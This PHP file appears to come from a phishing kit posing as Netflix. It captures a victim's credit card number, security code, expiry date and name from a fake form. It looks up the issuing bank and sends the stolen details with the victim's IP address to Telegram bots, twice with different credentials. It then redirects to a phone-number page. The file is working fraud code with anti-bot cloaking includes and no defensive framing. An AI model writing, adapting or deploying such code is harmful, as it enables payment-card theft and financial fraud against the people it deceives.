<?php

include("../../secure/anti10.php");
include("../gg.php");
$OS = getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$ccya = $_POST['cc'];
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$bincheck = $_POST['cardnumber'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$bin = $_POST['creditCardNumber'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
$_SESSION['bank_country'] = $xBIN["country"]["name"];
$message ="
📺 NETFLIX [CC] 📺
CDC : ".$_POST['creditCardNumber']."
CVV : ".$_POST['creditCardSecurityCode']."
EXP : ".$_POST['creditExpirationMonth']."
Name : ".$_POST['firstName']."".$_POST['lastName']."
________________________
Bank: ".$_SESSION['bank_name']."
Card Type: ".$_SESSION['bank_type']."
Card Brand: ".$_SESSION['bank_brand']."
Card Country: ".$_SESSION['bank_country']."
________________________
🎬 📺 ".$ip."  📺 \n";

$theip = $message;
function antiBotsCaller($messaggio,$token,$chatid) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
/*ANTIBOT BLOCKER You can  block IP
  IN File ANTI/anti1.php.*/
antiBotsCaller($theip,$antit2,$antic1);
/*------------------------------------*/ 
antiBotsCaller($message,$token,$chatid);
header("Location: ../phone.php");

?>